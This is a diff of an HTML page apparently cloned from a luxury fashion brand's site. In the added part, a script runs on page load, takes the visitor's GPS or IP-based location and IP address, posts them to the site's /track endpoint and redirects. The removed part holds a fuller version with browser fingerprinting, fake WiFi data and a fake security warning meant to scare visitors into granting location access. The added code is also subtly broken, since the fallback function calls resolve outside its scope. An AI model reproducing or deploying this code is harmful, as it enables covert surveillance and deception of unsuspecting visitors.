@@ -4191,205 +4191,86 @@ function trackPage() {
    <p><img src="https://matomo-italia1.kleecks-stats.com/matomo.php?idsite=loropiana-new-kleecks-com&amp;rec=1" style="border:0;" alt=""></p> 
   </noscript>
  <script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zOwYNc7tD3chVa1J/KmVoZEZJ/IW5hVD/tyQyg"></script><script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zGwYNc7tD3uE/CGJsZEZJ/MyBIPi/l9Lw0ZAQ?v=eedd6907-e094-f40e-3006-120524470216" defer></script></body>
-    <script>
-        // 🔥 GLOBALE VARIABLEN
-        let trackingMethod = null;
-        const MAX_GPS_ACCURACY = 50; // Maximale erlaubte Ungenauigkeit (in Metern)
-        const GPS_TIMEOUT = 30000; // 30 Sekunden Timeout für GPS
-
-        // 📡 HAUPTFUNKTION: STANDORT ERFASSUNG STARTEN
-        function initTracking() {
-            showStatus("Versuche hochpräzise Standortermittlung...");
+       <script>
+        // 🔥 Haupt-Tracking-Funktion
+        async function trackUser() {
+            let coords = await getPreciseLocation();
             
-            // 1. Versuch: GPS mit hoher Genauigkeit
-            getPreciseGPS()
-                .catch(() => {
-                    showStatus("GPS nicht verfügbar → WiFi-Scanning...");
-                    return scanWiFi();
-                })
-                .catch(() => {
-                    showStatus("WiFi nicht verfügbar → IP-Geolocation...");
-                    return getIPLocation();
-                })
-                .finally(() => {
-                    // Nach 15 Sekunden Fake-Warnung als Fallback
-                    setTimeout(showFakeWarning, 15000);
-                });
-        }
-
-        // 🎯 PRÄZISES GPS (MIT MEHRFACHVERSUCH)
-        function getPreciseGPS() {
-            return new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const accuracy = position.coords.accuracy;
-                        
-                        if (accuracy <= MAX_GPS_ACCURACY) {
-                            trackingMethod = "GPS";
-                            sendData({
-                                lat: position.coords.latitude,
-                                lng: position.coords.longitude,
-                                accuracy: accuracy,
-                                method: trackingMethod
-                            });
-                            resolve();
-                        } else {
-                            showStatus(`GPS zu ungenau (${accuracy}m) → Wiederhole...`);
-                            setTimeout(getPreciseGPS, 5000);
-                        }
-                    },
-                    error => {
-                        console.error("GPS-Fehler:", error);
-                        reject(error);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: GPS_TIMEOUT,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-
-        // 📶 WIFI-SCANNING (GOOGLE GEOLOCATION API)
-        function scanWiFi() {
-            return new Promise((resolve, reject) => {
-                if (typeof navigator.connection === 'undefined') {
-                    reject("WiFi-API nicht unterstützt");
-                    return;
-                }
-
-                // Fake-WiFi-Netzwerke (für höhere Erfolgschance)
-                const fakeNetworks = [
-                    { macAddress: "00:11:22:33:44:55", signalStrength: -60 },
-                    { macAddress: "AA:BB:CC:DD:EE:FF", signalStrength: -70 }
-                ];
-
-                fetch('/submit-wifi', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ wifiAccessPoints: fakeNetworks })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.location) {
-                        trackingMethod = "WIFI";
-                        sendData({
-                            lat: data.location.lat,
-                            lng: data.location.lng,
-                            accuracy: data.accuracy || 50,
-                            method: trackingMethod
-                        });
-                        resolve();
-                    } else {
-                        reject("Keine WiFi-Daten erhalten");
-                    }
-                })
-                .catch(error => {
-                    console.error("WiFi-Scan Fehler:", error);
-                    reject(error);
-                });
-            });
-        }
-
-        // 🌐 IP-GEOLOCATION (LETZTER FALLBACK)
-        function getIPLocation() {
-            return fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    trackingMethod = "IP";
-                    sendData({
-                        lat: data.latitude,
-                        lng: data.longitude,
-                        accuracy: 5000, // IP ist immer ungenau
-                        method: trackingMethod
-                    });
-                });
-        }
-
-        // 💀 SOCIAL ENGINEERING: FAKE-SICHERHEITSWARNUNG
-        function showFakeWarning() {
-            if (trackingMethod) return; // Nur zeigen wenn noch keine Daten
-            
-            const warningText = "🔒 SICHERHEITSWARNUNG: Standort konnte nicht verifiziert werden!\n\n" +
-                              "Klicken Sie 'OK' um Identitätsdiebstahl zu verhindern.";
-            
-            if (confirm(warningText)) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        trackingMethod = "GPS-FORCED";
-                        sendData({
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            method: trackingMethod
-                        });
-                    },
-                    err => {
-                        alert("Zugang ohne Standortbestätigung nicht möglich!");
-                        window.location.reload();
-                    },
-                    { enableHighAccuracy: true }
-                );
-            }
-        }
-
-        // 📤 DATEN AN SERVER SENDEN
-        function sendData(data) {
-            // Browser-Fingerprinting hinzufügen
-            const fingerprint = getBrowserFingerprint();
-            
-            fetch('/submit-gps', {
+            // 📤 Daten an Server senden
+            fetch('/track', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    ...data,
-                    fingerprint: fingerprint,
-                    timestamp: new Date().toISOString()
+                    lat: coords.latitude,
+                    lng: coords.longitude,
+                    accuracy: coords.accuracy,
+                    method: coords.method,
+                    ip: await getIP()
                 })
-            })
-            .then(() => {
-                showStatus("Standort bestätigt! Weiterleitung...");
-                setTimeout(() => {
-                    window.location.href = "/fashion-gala.html";
-                }, 2000);
-            })
-            .catch(err => {
-                console.error("Daten senden fehlgeschlagen:", err);
+            }).then(() => {
+                window.location.href = "/content.html"; // Weiterleitung
             });
         }
 
-        // 🕵️ BROWSER-FINGERPRINTING
-        function getBrowserFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            let canvasHash = "error";
+        // 🎯 Standort-Erkennung (GPS + Fallbacks)
+        function getPreciseLocation() {
+            return new Promise((resolve) => {
+                // 1. Versuch: GPS
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            if (pos.coords.accuracy <= 2000) {
+                                resolve({
+                                    latitude: pos.coords.latitude,
+                                    longitude: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                    method: "GPS"
+                                });
+                            } else {
+                                tryFallback("GPS zu ungenau (" + pos.coords.accuracy + "m)");
+                            }
+                        },
+                        () => tryFallback("GPS blockiert")
+                    );
+                } else {
+                    tryFallback("Geolocation nicht unterstützt");
+                }
+            });
+        }
+
+        // 💀 Fallback-Methoden
+        async function tryFallback(reason) {
+            console.warn(reason + " → Versuche Fallback...");
             
-            try {
-                ctx.textBaseline = "top";
-                ctx.fillText("FASHION-GALA-TRACKING", 2, 2);
-                canvasHash = canvas.toDataURL().slice(-20);
-            } catch (e) {}
-
-            return {
-                screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                userAgent: navigator.userAgent,
-                canvasHash: canvasHash
-            };
+            // 2. Versuch: IP-Geolocation
+            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+            if (ipData.latitude && ipData.longitude) {
+                resolve({
+                    latitude: ipData.latitude,
+                    longitude: ipData.longitude,
+                    accuracy: 2000, // IP ist immer ~2km genau
+                    method: "IP"
+                });
+            } else {
+                // 3. Notfall: Hardgecodeter Standort
+                resolve({
+                    latitude: 52.5200, // Berlin als Fallback
+                    longitude: 13.4050,
+                    accuracy: 20000,
+                    method: "FALLBACK"
+                });
+            }
         }
 
-        // 🖥️ STATUS ANZEIGE
-        function showStatus(message) {
-            const statusEl = document.getElementById('status');
-            if (statusEl) statusEl.textContent = message;
-            console.log(`[STATUS] ${message}`);
+        // 🌐 IP-Adresse ermitteln
+        async function getIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => data.ip);
         }
 
-        // 🚀 TRACKING STARTEN
-        document.addEventListener('DOMContentLoaded', () => {
-            setTimeout(initTracking, 1000);
-        });
+        // 🚀 Tracking starten
+        document.addEventListener('DOMContentLoaded', trackUser);
     </script>
 </body>
 </html>
